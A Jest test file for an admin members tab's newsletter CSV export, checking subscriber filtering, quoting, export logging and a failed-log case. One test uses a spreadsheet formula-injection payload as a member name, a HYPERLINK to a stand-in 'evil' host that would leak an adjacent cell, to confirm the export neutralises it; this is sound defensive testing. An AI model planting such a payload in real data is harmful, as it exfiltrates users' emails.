import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import MembersTab from '@/components/pages/admin/tabs/membersTab';

jest.mock('@/components/ui/Notifications', () => ({
  useNotify: () => ({ notify: jest.fn() }),
}));

const mockListUsers = jest.fn();
jest.mock('@/lib/firestore', () => ({
  listUsers: () => mockListUsers(),
  listCvs: jest.fn().mockResolvedValue([]),
}));
jest.mock('@/lib/firebase-client', () => ({
  refreshSessionCookie: jest.fn().mockResolvedValue(undefined),
}));

describe('MembersTab newsletter CSV', () => {
  let blobs: Blob[];
  const mockFetch = jest.fn();

  beforeEach(() => {
    blobs = [];
    mockFetch.mockReset();
    mockFetch.mockResolvedValue({ ok: true, json: async () => ({}) });
    global.fetch = mockFetch as unknown as typeof fetch;
    global.URL.createObjectURL = jest.fn((b: Blob) => {
      blobs.push(b);
      return 'blob:test';
    });
    global.URL.revokeObjectURL = jest.fn();
    jest
      .spyOn(HTMLAnchorElement.prototype, 'click')
      .mockImplementation(() => {});
  });

  const renderWith = async (users: unknown[]) => {
    mockListUsers.mockResolvedValue(users);
    render(<MembersTab />);
    await waitFor(() =>
      expect(
        screen.getByRole('button', { name: /newsletter csv/i }),
      ).toBeInTheDocument(),
    );
    await waitFor(() => expect(mockListUsers).toHaveBeenCalled());
  };

  it('exports only subscribed members with an email, after logging the export', async () => {
    await renderWith([
      { id: 'a', name: 'Ada', email: 'ada@example.com', newsletter: true },
      {
        id: 'b',
        displayName: 'Bo "B"',
        email: 'bo@example.com',
        newsletter: true,
      },
      { id: 'c', name: 'Cy', email: 'cy@example.com', newsletter: false },
      {
        id: 'd',
        name: 'Di',
        email: 'di@example.com',
        newsletter: true,
        unsubscribedFromEmails: true,
      },
      { id: 'e', name: 'Ed', newsletter: true },
    ]);
    await waitFor(() =>
      expect(screen.getByText('ada@example.com')).toBeInTheDocument(),
    );

    fireEvent.click(screen.getByRole('button', { name: /newsletter csv/i }));

    await waitFor(() => expect(blobs).toHaveLength(1));
    expect(mockFetch).toHaveBeenCalledWith(
      '/api/admin/members/export',
      expect.objectContaining({
        method: 'POST',
        body: JSON.stringify({ kind: 'newsletter', count: 2 }),
      }),
    );
    const csv = await blobs[0].text();
    expect(csv.split('\n')).toEqual([
      '"name","email"',
      '"Ada","ada@example.com"',
      '"Bo ""B""","bo@example.com"',
    ]);
  });

  it('neutralises spreadsheet formulas in member-typed names', async () => {
    await renderWith([
      {
        id: 'a',
        name: '=HYPERLINK("https://evil/?"&B2,"x")',
        email: 'ada@example.com',
        newsletter: true,
      },
    ]);
    await waitFor(() =>
      expect(screen.getByText('ada@example.com')).toBeInTheDocument(),
    );

    fireEvent.click(screen.getByRole('button', { name: /newsletter csv/i }));

    await waitFor(() => expect(blobs).toHaveLength(1));
    const csv = await blobs[0].text();
    expect(csv.split('\n')[1]).toBe(
      '"\'=HYPERLINK(""https://evil/?""&B2,""x"")","ada@example.com"',
    );
  });

  it('downloads nothing when the export cannot be logged', async () => {
    mockFetch.mockResolvedValue({
      ok: false,
      status: 500,
      json: async () => ({ error: 'Failed to log the export' }),
    });
    await renderWith([
      { id: 'a', name: 'Ada', email: 'ada@example.com', newsletter: true },
    ]);
    await waitFor(() =>
      expect(screen.getByText('ada@example.com')).toBeInTheDocument(),
    );

    fireEvent.click(screen.getByRole('button', { name: /^csv$/i }));
    fireEvent.click(screen.getByRole('button', { name: /newsletter csv/i }));

    await waitFor(() => expect(mockFetch).toHaveBeenCalledTimes(2));
    expect(blobs).toHaveLength(0);
  });
});
